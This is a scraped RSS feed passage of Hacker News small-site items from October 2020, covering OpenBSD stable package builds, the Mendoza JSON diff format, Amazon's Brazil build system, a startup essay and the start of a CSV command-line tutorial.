<section id="testing">
	<div>
		<p><img width="768" height="512" src="https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-768x512.jpg" alt="" sizes="(max-width: 1400px) 100vw, 1400px" srcset="https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-768x512.jpg 768w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-600x400.jpg 600w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-1024x683.jpg 1024w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-1536x1024.jpg 1536w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-2048x1365.jpg 2048w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-360x240.jpg 360w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-1320x880.jpg 1320w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-400x267.jpg 400w, https://www.daliborfarny.com/wp-content/uploads/2018/07/LKJ4574-scaled.jpg 2560w"></p><div>
			<p>06 / <span>06</span></p>
			<h2>Testing the tubes</h2>
			<p>When the tube is finished, we test it to detect potential errors.</p>
		</div>
	</div>
</section>
 
	
	





























<!-- WooCommerce JavaScript -->



</div>]]>
            </description>
            <link>https://www.daliborfarny.com/manufacture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943931</guid>
            <pubDate>Fri, 30 Oct 2020 16:30:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How the OpenBSD -stable packages are built]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943808">thread link</a>) | @zdw
<br/>
October 30, 2020 | https://dataswamp.org/~solene/2020-10-29-official-openbsd-stable-architecture.html | <a href="https://web.archive.org/web/*/https://dataswamp.org/~solene/2020-10-29-official-openbsd-stable-architecture.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article id="20201029">
  <header>
  
    
    <p>Written by <em>Solène</em>, on 29 October 2020.<br>Tags: 
<span><a href="https://dataswamp.org/~solene/tag-openbsd.html">#openbsd</a></span>

</p>
    
  </header>
  <p>In this long blog post, I will write about the technical details
of the OpenBSD stable packages building infrastructure. I have setup
the infrastructure with the help of Theo De Raadt who provided me
the hardware in summer 2019, since then, OpenBSD users can upgrade
their packages using <code>pkg_add -u</code> for critical updates that has
been backported by the contributors. Many thanks to them, without
their work there would be no packages to build. Thanks to pea@ who
is my backup for operating this infrastructure in case something
happens to me.</p>

<p><strong>The total lines of code used is around 110 lines of shell.</strong></p>

<h2 id="originaldesign">Original design</h2>

<p>In the original design, the process was the following. It was done
separately on each machine (amd64, arm64, i386, sparc64).</p>

<h3 id="updatingports">Updating ports</h3>

<p>First step is to update the ports tree using <code>cvs up</code> from a cron
job and capture its output. <strong>If</strong> there is a result, the process
continues into the next steps and we discard the result.</p>

<p>With CVS being per-directory and not using a database like git or
svn, it is not possible to “poll” for an update except by verifying
every directory if a new version of files is available. This check
is done three time a day.</p>

<h3 id="makealistofportstocompile">Make a list of ports to compile</h3>

<p>This step is the most complicated of the process and weights for a
third of the total lines of code.</p>

<p>The script uses <code>cvs rdiff</code> between the cvs release and stable
branches to show what changed since release, and its output is
passed through a few grep and awk scripts to only retrieve the
“pkgpaths” (the pkgpath of curl is <strong>net/curl</strong>) of the packages
that were updated since the last release.</p>

<p>From this raw output of cvs rdiff:</p>

<pre><code>File ports/net/dhcpcd/Makefile changed from revision 1.80 to 1.80.2.1
File ports/net/dhcpcd/distinfo changed from revision 1.48 to 1.48.2.1
File ports/net/dnsdist/Makefile changed from revision 1.19 to 1.19.2.1
File ports/net/dnsdist/distinfo changed from revision 1.7 to 1.7.2.1
File ports/net/icinga/core2/Makefile changed from revision 1.104 to 1.104.2.1
File ports/net/icinga/core2/distinfo changed from revision 1.40 to 1.40.2.1
File ports/net/synapse/Makefile changed from revision 1.13 to 1.13.2.1
File ports/net/synapse/distinfo changed from revision 1.11 to 1.11.2.1
File ports/net/synapse/pkg/PLIST changed from revision 1.10 to 1.10.2.1
</code></pre>

<p>The script will produce:</p>

<pre><code>net/dhcpcd
net/dnsdist
net/icinga/core2
net/synapse
</code></pre>

<p>From here, for each pkgpath we have sorted out, the sqlports database
is queried to get the full list of pkgpaths of each packages, this
will include all packages like flavors, subpackages and multipackages.</p>

<p>This is important because an update in <code>editors/vim</code> pkgpath will
trigger this long list of packages:</p>

<pre><code>editors/vim,-lang
editors/vim,-main
editors/vim,gtk2
editors/vim,gtk2,-lang
[...40 results hidden for readability...]
editors/vim,no_x11,ruby
editors/vim,no_x11,ruby,-lang
editors/vim,no_x11,ruby,-main
</code></pre>

<p>Once we gathered all the pkgpaths to build and stored them in a
file, next step can start.</p>

<h3 id="preparingtheenvironment">Preparing the environment</h3>

<p>As the compilation is done on the real system (using PORTS_PRIVSEP
though) and not in a chroot we need to clean all packages installed
except the minimum required for the build infrastructure, which are
rsync and sqlports.</p>

<p><code>dpb(1)</code> can’t be used because it didn’t gave good results for
building the delta of the packages between release and stable.</p>

<p>The various temporary directories used by the ports infrastructure
are cleaned to be sure the build starts in a clean environment.</p>

<h3 id="compilingandcreatingthepackages">Compiling and creating the packages</h3>

<p>This step is really simple. The ports infrastructure is used
to build the packages list we produced at step 2.</p>

<pre><code>env SUBDIRLIST=package_list BULK=yes make package
</code></pre>

<p>In the script there is some code to manage the logs of the previous
batch but there is nothing more.</p>

<p>Every new run of the process will pass over all the packages which
received a commit, but the ports infrastructure is smart enough to
avoid rebuilding ports which already have a package with the correct
version.</p>

<h3 id="transferthepackagetothesigningteam">Transfer the package to the signing team</h3>

<p>Once the packages are built, we need to pass only the built
packages to the person who will manually sign the packages before
publishing them and have the mirrors to sync.</p>

<p>From the package list, the package file lists are generated and
reused by rsync to only copy the packages generated.</p>

<pre><code>env SUBDIRLIST=package_list show=PKGNAMES make | grep -v "^=" | \
      grep ^. | tr ' ' '\n' | sed 's,$,\.tgz,' | sort -u
</code></pre>

<p><strong>The system has all the -release packages in
<code>${PACKAGE_REPOSITORY}/${MACHINE_ARCH}/all/</code> (like
<code>/usr/ports/packages/amd64/all</code>) to avoid rebuilding all dependencies
required for building a package update, thus we can’t copy all the
packages from the directory where the packages are moved after
compilation.</strong></p>

<h3 id="sendanotification">Send a notification</h3>

<p>Last step is to send an email with the output of rsync to send an
email telling which machine built which package to tell the people
signing the packages that some packages are available.</p>

<p>As this process is done on each machine and that they
don’t necessarily build the same packages (no firefox on sparc64)
and they don’t build at the same speed (arm64 is slower), mails
from the four machines could arrive at very different time, which
led to a small design change.</p>

<p>The whole process is automatic from building to delivering the
packages for signature. The signature step requires a human to be
done though, but this is the price for security and privilege
separation.</p>

<h2 id="currentdesign">Current design</h2>

<p>In the original design, all the servers were running their separate
cron job, updating their own cvs ports tree and doing a very long
cvs diff. The result was working but not very practical for the
people signing who were receiving mails from each machine for each
batch.</p>

<p>The new design only changed one thing: One machine was chosen to
run the cron job, produce the package list and then will copy that
list to the other machines which update their ports tree and run
the build. Once all machines finished to build, the initiator machine
will gather outputs and send an unique mail with a summary of each
machine. This became easier to compare the output of each architecture
and once you receive the email this means every machine finished
their job and the signing can be done.</p>

<p>Having the summary of all the building machines resulted in another
improvement: In the logic of the script, it is possible to send an
email telling absolutely no package has been built while the process
was triggered, which means, something went wrong. From here, I
need to check the logs to understand why the last commit didn’t
produce a package. This can be failures like a <strong>distinfo</strong> file
update forgotten in the commit.</p>

<p>Also, this permitted fixing one issue: As the distfiles are shared
through a common NFS mount point, if multiples machines try to fetch
a distfile at the same time, both will fail to build. Now, the
initiator machine will download all the required distfiles before
starting the build on every node.</p>

<p>All of the previous scripts were reused, except the one
sending the email which had to be rewritten.</p>


</article>

</div></div>]]>
            </description>
            <link>https://dataswamp.org/~solene/2020-10-29-official-openbsd-stable-architecture.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943808</guid>
            <pubDate>Fri, 30 Oct 2020 16:19:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mendoza: Use stack machines to compute efficient JSON diffs]]>
            </title>
            <description>
<![CDATA[
Score 114 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24943775">thread link</a>) | @evenw
<br/>
October 30, 2020 | https://www.sanity.io/blog/mendoza | <a href="https://web.archive.org/web/*/https://www.sanity.io/blog/mendoza">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>When we started work on the recently released feature <a href="https://www.sanity.io/blog/review-changes">Review Changes</a>, we needed a way to keep a significant part of the edit history of a document in the browser memory to be able to respond quickly to different user interface states. As the user picked various document versions to compare we wanted to be able to quickly reconstruct a specific section of the history of a document. </p><figure><div role="button"><div data-has-aspect="false"></div></div><figcaption>Review Changes for Sanity Studio. Powered by Mendoza.</figcaption></figure><p>For text diffs, we use the <a href="https://github.com/google/diff-match-patch">diff-match-patch format</a>, and we just assumed someone would have implemented a similarly efficient and compact diff format for JSON documents, but no such luck. If we wanted a general JSON diff format that was super compact and fast to apply, we would have to invent it ourselves. And thus, Mendoza, the totally non-human readable diff format for structured JSON documents, was born.</p><p>Mendoza is:</p><ul><li>Lightweight JSON format</li><li>A flexible format that can accommodate more advanced encodings in the future</li><li>As a Go library for encoding and decoding</li><li>A JavaScript library for decoding</li><li>Efficient handling of the renaming of fields</li><li>Efficient handling of reordering of arrays</li><li>Not designed to be human-readable</li></ul><p>Mendoza differs (hah!) from normal diffs as they are:</p><ul><li>Made for humans to read and understand and based on simple operations (like keep, insert, and delete text)</li><li>Possible to apply even if the source has changed a bit by including some of the contexts around every part that has changed</li><li>Designed for text, and not structured documents</li></ul><p>Now, this is great when you are collaborating with humans on code development and use something like git to track your changes. What it isnâ€™t great for, however, is expressing differences between structured documents (such as JSON) in a compact manner that can be efficiently transferred over the network and parsed in JavaScript inside of browsers.</p><div data-block-key="27e85758c59a"><h2><a id="most-diffs-arent-meant-for-machines-27e85758c59a"></a><a href="#most-diffs-arent-meant-for-machines-27e85758c59a"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 24"><path d="M0 0h24v24H0z" fill="none"></path><path fill="currentColor" d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a>Most diffs aren't meant for machines</h2></div><p>Most diff formats are made to be human-readable. Take these two documents, where a key and the array have some changes between them:</p><p>If these where two commits, the Git diff between them would be expressed like this:</p><p>This makes it somewhat practical for humans to understand what is going on when the latter change is applied. But as you can see, in terms of pure data, there is a lot of repetition going on. and expressing all changes with only plusses and minuses isn't very efficient.</p><p>The same diff with Mendoza is expressed like this:</p><p>Mendoza constructs a minimal recipe for transforming a document into another. All it really does is to compare two JSON documents and figure out the most minimal way to express their difference as strings and integers in an array. You can use this difference to reconstruct the first document to the other.</p><div data-block-key="308db67aa205"><h2><a id="how-to-read-a-mendoza-patch-even-though-you-shouldnt-308db67aa205"></a><a href="#how-to-read-a-mendoza-patch-even-though-you-shouldnt-308db67aa205"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 24"><path d="M0 0h24v24H0z" fill="none"></path><path fill="currentColor" d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a>How to read a Mendoza patch (even though you shouldn't)</h2></div><p>A Mendoza patch consists of an array of integers and strings. The integers are <em>opcodes</em> (short for â€œoperation codesâ€�), 8-bit numbers that correspond to an operation. Opcodes take parameters as strings, positive numbers, or JSON values (that is: the actual data that is changing). The list of available opcodes is as follows, notice that 10-18 are composites of the preceding ones:</p><ul><li>0 <code>Value<!-- -->â€‹ </code></li><li>1 <code>Copy<!-- -->â€‹ </code></li><li>2 <code>Blank<!-- -->â€‹</code></li><li>3 <code>ReturnIntoArray<!-- -->â€‹ </code></li><li>4 <code>ReturnIntoObject<!-- -->â€‹ </code></li><li>5 <code>ReturnIntoObjectSameKey<!-- -->â€‹ </code></li><li>6 <code>PushField<!-- -->â€‹ </code></li><li>7 <code>PushElement<!-- -->â€‹ </code></li><li>8 <code>PushParent<!-- -->â€‹ </code></li><li>9 <code>Pop<!-- -->â€‹ </code></li><li>10 <code>PushFieldCopy</code></li><li>11 <code>PushFieldBlank</code></li><li>12 <code>PushElementCopy</code></li><li>13 <code>PushFieldBlank</code></li><li>14 <code>ReturnIntoObjectPop</code></li><li>15 <code>ReturnIntoObjectSameKeyPop</code></li><li>16 <code>ReturnIntoArrayPop</code></li><li>17 <code>ObjectSetFieldValue</code></li><li>18 <code>ObjectCopyField</code></li><li>19 <code>ObjectDeleteField</code>â€‹ </li><li>20 <code>ArrayAppendValue</code>â€‹ </li><li>21 <code>ArrayAppendSlice<!-- -->â€‹</code></li><li>22 <code>StringAppendString<!-- -->â€‹</code></li></ul><p>Mendoza reads these opcodes from the patch and produces the resulting document from them. Depending on the patch, Mendoza might choose not to strictly follow the opcodes but take a simpler path. If every field and value has changed, for example, itâ€™s more efficient just to replace the whole document with the new data without going through all the operations. Or if you have a list of objects where one has moved to another position and changed a key-value, Mendoza will manage to go back to the original and represent the change in a cheap way.</p><p>Mendoza is implemented in Go and can be found in this <a href="https://github.com/sanity-io/mendoza">GitHub repository</a>. We have also made <a href="https://github.com/sanity-io/mendoza-js">a parser for Mendoza patches in JavaScript</a>, that you can use in your own application. </p><p>Of course, you can dive into <a href="https://github.com/sanity-io/sanity/blob/a3f7158016d63728a9b435e6ab444ff2b90fd424/packages/%40sanity/desk-tool/src/panes/documentPane/documentHistory/history/timeline.ts#L421">the source code for the Sanity Studio</a> and explore how Mendoza is used there. If you want a slightly simpler use-case, you can also <a href="https://github.com/sanity-io/groq-store/blob/main/src/patch.ts">check out how weâ€™re using Mendoza to simulate a part of Sanityâ€™s real-time datastore</a> in the browser to power the <a href="https://github.com/sanity-io/next-sanity">real-time preview for Next.js</a>. </p><p>Naming a project is always difficult. Since this project is focused on representing changes between <em>JSON</em> documents I naturally started thinking about names like "JSON differ, JSON changes, JSON patch, â€¦". However, most of these names have already been used by existing projects. While I was muttering "JSON, JSON, JSON" it suddenly turned into "JSON, JSON, Jason, Jason Mendoza".</p><p>Jason Mendoza is a character from the show The Good Place, and while this project has little in common with the stupidest DJ from Florida, at least it's short and catchy.</p><p>Since a Mendoza patch is just describing the effect of a change it is also limited to work for the documents it was based on. It doesnâ€™t come with guarantees for consistency if the document you apply it on has changed from the original in meanwhile. This is one of the tradeoffs that we needed to do to make it really compressed. </p></div></div></div>]]>
            </description>
            <link>https://www.sanity.io/blog/mendoza</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943775</guid>
            <pubDate>Fri, 30 Oct 2020 16:15:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pondering Amazon's Manyrepo Build System]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24943737">thread link</a>) | @nephics
<br/>
October 30, 2020 | http://beza1e1.tuxen.de/amazon_manyrepo_builds.html | <a href="https://web.archive.org/web/*/http://beza1e1.tuxen.de/amazon_manyrepo_builds.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>A while ago,
<a href="http://beza1e1.tuxen.de/monorepo_vcs.html">I pondered monorepo version control systems</a>.
This article is at the opposite end of the spectrum: Manyrepos.</p>
<h2>Why Manyrepo?</h2>
<p>Monorepos are alluring since Google, Facebook, and Microsoft use that approach.
Is that a part of their secret sauce or accidental?
There is another big tech company which does the opposite.
At Amazon, teams work more independently.
Some use different version control systems which are not git
like Subversion and Perforce.
I guess that most companies do <em>not</em> have a monorepo
because it is really easy to split of a separate project
but hard to merge them just from an organizational point of view.
So maybe we can learn more from Amazon than Google?</p>
<p>A common pattern is that Amazon like the others built its own infrastructure
and engineers love it and miss it after they leave.</p>
<blockquote>
<p>I've heard descriptions and seen blog entries about many other large companies build systems, but to be honest, nothing even comes close to the amazing technology Amazon has produced.
I would probably argue that what Google, Facebook, and most other companies of comparable size and larger do is at best objectively less good and at worst wasting millions of dollars of lost productivity.
–<a href="https://gist.github.com/terabyte/15a2d3d407285b8b5a0a7964dd6283b0">terabyte</a></p>
<p>Once you understand the build and deployment tools you first wonder how you ever did anything before and then start to fear how you'll do anything once you leave.
–<a href="https://gist.github.com/terabyte/15a2d3d407285b8b5a0a7964dd6283b0#gistcomment-3356000">hohle</a></p>
</blockquote>
<p>Just like Ex-Googlers reinvented their build system on the outside
with <a href="https://www.pantsbuild.org/docs">Pants</a>
and <a href="https://buck.build/">Buck</a>.
Likewise <a href="https://qbtbuildtool.com/">QBT</a> reinvents the Amazon build system.
Unfortunately, QBT is less known and less mature.</p>
<h2>Amazon's Build System</h2>
<p>There is less information about Amazon unfortunately.
Mine is from <a href="https://gist.github.com/terabyte/15a2d3d407285b8b5a0a7964dd6283b0">this gist</a>
and discussions on 
<a href="https://news.ycombinator.com/item?id=24722214">HN</a> and
<a href="https://lobste.rs/s/ykk54d/amazon_s_build_system">lobste.rs</a>.
If I got something wrong, please tell me.
The short version is that Amazon's "Brazil" tool is
more of a package system than a build system.
It is closer to Nix than to Bazel.</p>
<p><a href="https://gist.github.com/terabyte/15a2d3d407285b8b5a0a7964dd6283b0#gistcomment-3356000">Brazil delegates the actual build process to language-specific tools</a>.
Tools, like tmux, are also packaged with Brazil.
The interesting part is how packages are managed
and the core concept to understand is <em>version set</em>.</p>
<p>If you create a package at Amazon,
you specify an <em>interface version</em> like "1.1".
As long as changes are backwards-compatible,
the interface version is not changed.
When Brazil builds a package,
it appends an additional number to turn it into a <em>build version</em>
like "1.1.3847523".
You can only specify dependencies on interface versions.</p>
<p>Another thing Brazil does when building a package
is to record the transitive closure of dependencies
with their build versions.
Modern packaging tools differ between
"dependencies you want"
and "dependencies you actually used".
For example, <a href="https://doc.rust-lang.org/cargo/guide/cargo-toml-vs-cargo-lock.html">Cargo.toml and Cargo.lock in Rust</a>.</p>
<p>A <em>version set</em> is a collection of packages.
The "live" package is the special global one
which corresponds to a trunk branch in version control.
When you build a package "against" a version set,
the tests of all packages in the version set are executed,
and the version set is incremented.
Thus the individual package is updated
(or published if it was not part of the version set before).</p>
<p>Brazil dependencies are classified as runtime, build, and test dependencies.
So for deployment, it can strip everything but the runtime dependencies
from a version set.</p>
<p>Dependencies must be carefully managed in this environment
as a "dependency hell" scenario is possible.</p>
<blockquote>
<p>One of the biggest ways that brazil was misused was around handling of major versions [aka interface version].
For context, only a single major version of a package is allowed to exist in a versionset at a time. If you tried to merge in a different major version of a package into your versionset, your pipeline would fail to build due to "Major version conflicts". One of the biggest sins was around bumping the major versions of the dependencies in a library without bumping the major version of that library at the same time. This would lead to many broken pipelines. Let's say you have a library Foo-1.0 with a bunch of users on other teams. You decide to bump up the Guava version from 25 to 29 and publish the new version of Foo-1.0. Anyone consuming Foo-1.0 would automatically pick up the new version of that lib because it's just a minor version change, however the merge would fail with a "major version conflict" because the major version of Guava they're using in their versionset is still 25. This means you would either have to pin that library back at a previous version, or bump your dependency on Guava in all of you packages to 29.
–<a href="https://news.ycombinator.com/item?id=24731537">pentlander</a></p>
</blockquote>
<p>This is an insight that generalizes:
Updating a dependency major version is a breaking change
even if your API is stable.</p>
<h2>The Point?</h2>
<p>Overall, it sounds a lot like a distribution package manager like apt or Nix.
The difference of version sets is
that they provide a branching mechanism
and this is how teams can work independently.
How is that unique though?
You can fork with apt and Nix as well.
In a monorepo, it would be a branch.
It must be about something different.</p>
<p>One advantage of monorepos is that one can track all users.
Version sets in Brazil provide a similar mechanism
since it is a <em>central</em> database.
This is important in case of security updates, for example.
Unfortunately, in manyrepo environments this information is usually not available
and when an issue arise it must be arduously researched.
So maybe companies should build such infrastructure
instead of dreaming about monorepos?</p>
<p>Coming back to the advantage of manyrepos,
refering to Amazon we can describe it concretely:
Version sets allow you to use multiple interface versions of the same package
at once (not multiple build versions though).
This mixture is not technically possible with a git monorepo
(but with Subversion or Perforce).
This is at least one example of the general tradeoff.</p>
<blockquote>
<p>I don’t really think there’s a better or worse between the Amazon and Google/FB style build/deploy/source control systems, it’s primarily a reflection of the org/team structure and what they prioritize - there’s tension between team independence/velocity and crosscutting changes that optimize the whole codebase.
–<a href="https://lobste.rs/s/ykk54d/amazon_s_build_system#c_fzyzg6">revert</a></p>
</blockquote>
<p>I would like to see more discussion online about this.
Many companies should value the team independence over the crosscutting changes.
So the question is:
How to get the advantages we currently uniquely attribute to monorepos
in a manyrepo setting?
Amazon's Brazil has valuable ideas to contribute
and should be more widely known.</p>

</article><p>Amazon's build system provides valuable insights for manyrepo environments.</p></div>]]>
            </description>
            <link>http://beza1e1.tuxen.de/amazon_manyrepo_builds.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943737</guid>
            <pubDate>Fri, 30 Oct 2020 16:12:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Useless Inventions:Is Your Product a Solution in Search of a Problem?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943717">thread link</a>) | @rjyoungling
<br/>
October 30, 2020 | https://www.younglingfeynman.com/essays/uselessinventions | <a href="https://web.archive.org/web/*/https://www.younglingfeynman.com/essays/uselessinventions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ba977392c5ff62ef784f"><div><p>In Japanese, there’s a word for that…</p><blockquote><p><a href="https://en.wikipedia.org/wiki/Chind%C5%8Dgu" target="_blank">“Chindōgu</a> (珍道具) originated in Japan and is characterized by the invention of ingenious everyday gadgets that seem to be ideal solutions to particular problems, but which, in fact, cause more problems than they solve.”</p></blockquote></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604071674616_51027"><div><p>Even though chindōgu (which translates to strange tools), is more about making people laugh at the inventions that create more problems than they solve, I can't help but wince.</p><p>Aren't we guilty of that often?<br></p><p>There are voices that promote this approach but for most of us, it's a recipe for disaster. [1] It's just much easier to start with a lock and build a key than to create a key and then go into the world in search of a lock that it can open. [2]</p><p>If you start with the solution, you'll struggle with:</p><ol data-rte-list="default"><li><p>Finding the problem that it solves</p></li><li><p>Finding the people who have that problem.</p></li><li><p>Finding a group of people for whom that problem is actually a REAL problem.</p></li><li><p>Finding the people in the intersection between “it’s a real problem” and “I’ll pay for your solution.”</p></li></ol><p>Instead, if you want to maximize the probability of success, start with one of the following approaches:</p><ol data-rte-list="default"><li><p><strong>AUDIENCE-FIRST:</strong> Pick a tiny audience (&lt;10 people), and identify a problem that they have. Keep iterating problems and solutions until you've stumbled onto something that makes them say WOW!! instead of eh… [3] E.g. <a href="https://medium.com/@rrhoover/building-a-startup-build-an-audience-first-9fbba4f1fa15" target="_blank">Ryan Hoover with Product Hunt</a>.</p></li><li><p><strong>PROBLEM-FIRST:</strong> Notice a problem you have in your own life, then build something that solves it. That way you know for sure it's not an imaginary problem and you have a user that can help you iterate (you). E.g. Wozniak with the Apple I. <a href="https://www.younglingfeynman.com/essays/airbnb2?rq=wozniak" target="_blank"><em>More on that here</em></a><em>.</em></p></li><li><p><strong>NEEDS-BASED: </strong>Create something you just really want to see in the world. So the problem it solves for you is just, I want this and it doesn't exist. I'm not the biggest fan of this approach in general but it can work. E.g. Jack Dorsey with Twitter.</p></li></ol><p><em>[1] From </em><a href="https://www.younglingfeynman.com/essays/2019/3/8/start-with-the-who-or-with-the-what?rq=andy" target="_blank"><em>Start With The Who Or With The What?</em></a></p><blockquote><p><em>"…And Andy Rachleff (Benchmark Capital, Wealthfront) is of the mind that you should change the who, not the what. Starting with the market, leads to common and uninteresting problems, but if you start with the what, then you can find the right people."</em></p></blockquote></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604071674616_53117"><div><p><em>[2] Even worse is that most of us often build the most expensive, overengineered key. We build some perfect product with tons of infrastructure in anticipation of the immediate exponential growth we’ll get when we launch. But when it turns out the dogs aren’t eating the dog food, those resources are wasted. More on this in </em><a href="https://www.younglingfeynman.com/essays/paradigm?rq=success" target="_blank"><em>Paradigm Shift: Drastically Increase The Odds of Success</em></a><em>.</em></p><p><em>[3] More on that in </em><a href="https://www.younglingfeynman.com/essays/livewithout" target="_blank"><em>Create A Product That’s Hard To Live Without</em></a><em>. I disagree with the notion that it needs to be a "hair on fire problem." The hypothesis that you need to sell painkillers not vitamins seems plausible as a metaphor but empirically it doesn't pan out. There are tons of successful founders that solved something that was just an annoyance for their customers. Just focus on making something they love so much that it's hard to live without.</em></p></div></div></div>]]>
            </description>
            <link>https://www.younglingfeynman.com/essays/uselessinventions</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943717</guid>
            <pubDate>Fri, 30 Oct 2020 16:10:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[XSV is killing it when cleaning CSV data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943696">thread link</a>) | @ethink
<br/>
October 30, 2020 | https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line | <a href="https://web.archive.org/web/*/https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><figure><p><img src="https://uploads-ssl.webflow.com/5f359c073455c743bc873ee4/5f94930788d137b29665878b_clean-csv.jpg" loading="lazy" alt=""></p><figcaption>Photo by <a href="https://unsplash.com/@cdc?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">CDC</a> on <a href="https://unsplash.com/s/photos/covid?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure><p>Have you ever dealt with a big-scary CSV file that has many columns that you don’t want and many records that slow down the process for you to filter and get the desired information? </p><p>This tutorial is about using two command-line programs that can solve these problems; <a href="https://csvkit.readthedocs.io/en/latest/" target="_blank">csvkit</a> and <a href="https://github.com/BurntSushi/xsv" target="_blank">xsv</a>. We will compare the two at the end and see how performant each and when we can use one and not the other in terms of speed especially if we’re processing a large CSV file. In the last blog post, we talked about <a href="https://www.ezzeddinabdullah.com/posts/how-to-clean-text-data-at-the-command-line" target="_blank">how to clean text data at the command line</a> that I recommend to have a look at.</p><h2>Downloading COVID&nbsp;data from covidtracking</h2><p>Let's first download recent coronavirus data across the United States from <a href="https://covidtracking.com/data/download">COVID Tracking Project</a> which is a volunteer organization dedicated to collecting and publishing the data required to understand the COVID-19 outbreak in the US. Btw, The data is published under a <a href="https://creativecommons.org/licenses/by/4.0/">Creative Commons CC BY 4.0</a> license.</p><p>Let's do this by downloading the <a href="https://covidtracking.com/data/download/all-states-history.csv">CSV&nbsp;file manually</a> or using <em>curl</em>:</p><div><pre>$ curl -LO https://covidtracking.com/data/download/all-states-history.csv
</pre></div><p><strong>-LO </strong>is a combination of <strong>-L&nbsp;</strong>and <strong>-O</strong></p><ul role="list"><li><strong>-L </strong>is used to make sure if the URL&nbsp;has changed to another location, <em>curl</em> will redo the request on the new redirection link</li><li><strong>-O </strong>this option is used to create an output file of the same name of the requested file name which is <strong>all-states-history.csv </strong>here</li></ul><h2>Printing the CSV&nbsp;file headers</h2><p>Let's first print what column names we have for this <em>all-states.history.csv </em>file:</p><div><pre>$ csvcut -n all-states-history.csv 
  1: date
  2: state
  3: dataQualityGrade
  4: death
  5: deathConfirmed
  6: deathIncrease
  7: deathProbable
  8: hospitalized
  9: hospitalizedCumulative
 10: hospitalizedCurrently
 11: hospitalizedIncrease
 12: inIcuCumulative
 13: inIcuCurrently
 14: negative
 15: negativeIncrease
 16: negativeTestsAntibody
 17: negativeTestsPeopleAntibody
 18: negativeTestsViral
 19: onVentilatorCumulative
 20: onVentilatorCurrently
 21: pending
 22: positive
 23: positiveCasesViral
 24: positiveIncrease
 25: positiveScore
 26: positiveTestsAntibody
 27: positiveTestsAntigen
 28: positiveTestsPeopleAntibody
 29: positiveTestsPeopleAntigen
 30: positiveTestsViral
 31: recovered
 32: totalTestEncountersViral
 33: totalTestEncountersViralIncrease
 34: totalTestResults
 35: totalTestResultsIncrease
 36: totalTestsAntibody
 37: totalTestsAntigen
 38: totalTestsPeopleAntibody
 39: totalTestsPeopleAntigen
 40: totalTestsPeopleViral
 41: totalTestsPeopleViralIncrease
 42: totalTestsViral
 43: totalTestsViralIncrease
